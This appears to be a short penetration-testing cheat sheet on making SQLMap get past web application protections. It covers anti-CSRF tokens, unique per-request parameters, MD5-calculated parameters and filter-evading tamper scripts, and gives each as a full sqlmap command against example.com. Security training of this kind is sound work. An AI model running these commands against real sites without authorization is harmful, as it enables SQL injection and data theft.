# Bypass Web Application Protections
-----

### Anti-CSRF Token Bypass
- SQLMap will automatically attempt to bypass the protection.

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

--csrf-token: specify the token parameter name

### Unique Value Bypass
- Instead of using csrf-token, some web applications use unique value for each of the requests. We can use `--randomize` flag to bypass it.

```bash
sqlmap -u "https://www.example.com/?id=1&rp=8421" --randomize=rp --batch -v 5 | grep URI
```

--randomize: specify the parameter `rp`, whose value needs to be unique.

### Calculated Parameter Bypass
- A lot of applications use MD5 hash to hash certains values of parameter. We can use `--eval` flag to perform such task

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

--eval: evaluate the hash function before sending the request. In this case, it is the id that will be hashed.

### Tamper script
- One of the most popular tamper scripts between is replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes (`--tamper=between,randomcase`)
- To view the list of tamper script, use `--list-tampers`
